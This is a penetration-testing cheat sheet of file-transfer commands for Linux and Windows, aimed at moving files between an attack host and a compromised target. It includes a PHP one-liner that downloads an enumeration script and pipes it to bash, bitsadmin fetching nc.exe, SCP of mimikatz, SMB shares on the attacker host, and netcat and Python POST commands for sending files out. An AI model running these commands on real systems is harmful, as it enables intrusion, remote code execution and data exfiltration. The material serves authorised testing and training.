# File Transfert - 

% linux, windows

## Download a file using Bitsadmin
```
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

## Download a file using Wget
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

## Download a file using cURL
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Download a file using PHP
```
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

## Upload a file using SCP
```
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

## Download a file using SCP
```
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

## Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
```
python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/
```

## Uses smbserver.py with password support (in case GPO blocks anonymous access) to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
```
python3 smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share $(pwd)
```
## Mount disk on a drive
```
Cmd > net use Z: \\10.10.14.153\share /u:snovvcrash 'Passw0rd!'
```

## Python2 - urlretrieve
```
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<file>")'
```
## Python3 - urlretrieve
```
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<file>")'
```

## PHP - download file file_get_content()
```markdown
php -r '$file = file_get_contents("<URL>"); file_put_contents("<file>",$file);'
```

## PHP - download file fopen()
```markdown
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<file>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

## PHP - Download and pipe it to bash
```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby - download a file
```markdown
ruby -e 'require "net/http"; File.write("<file>", Net::HTTP.get(URI.parse("<URL>")))'
```
## Python - upload/POST a file
```
python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"files":open("<file>","rb")})'
```

## nc - send file to compomised host
```
nc -q 0 <IP> <PORT> < <file>
```

## nc - send file to compomised host
```
nc -l -p <PORT> -q 0 < <file>
```

## netcat - send file to compomised host
```
ncat --send-only  <IP> <PORT> < <file>
```

## nc - recv file from listening port
```
nc -l -p <PORT> > <file>
```

## netcat - recv file from listening port
```
netcat -l -p <PORT> --recv-only > <file>
```

## certreq - upload/POST file
```markdown
certreq.exe -Post -config <URL> <output_file>
```

## Bitstransfert - file donwload
```markdown
Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>" -Destination "<output_file>"
```

## chrome user agent - download file
```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>:<PORT>/<file> -UserAgent $UserAgent -OutFile "<outfile>"
```

## Create a SMB share on linux with a NFS block fs, mount it on windows
```
# 1. Create NFS block fs of size2GB
dd if /dev/zero of=NTFS.DISK bs=1024M count=2

# 2. Mount on loopback device
losetup -fP NTFS.DISK # -f: find first unused device, -P : create a partitioned loop device

# 3. Format the block to the desired fs
sudo mkfs.ntfs /dev/loop<NUMBER>

# 4. Mount the fs
sudo mount /dev/loop<NUMBER> <YOUR MOUNTPOINT>

# 5. Edit the smbd daemon conf, add a share by adding the following lines
# /etc/samba/smb.conf
[<SHARE NAME>]
  comment = foo
  path = <YOUR MOUNTPOINT>
  browseable = yes
  read only = no
  guest ok = yes

# 6. Restart sbmd.service
sudo systemctl restart smbd

# 7. Mount smb share from Windows on the X: share
net use x: \\<ATTACKER IP>\<SHARE NAME>
net use x: /delete # to delete
```
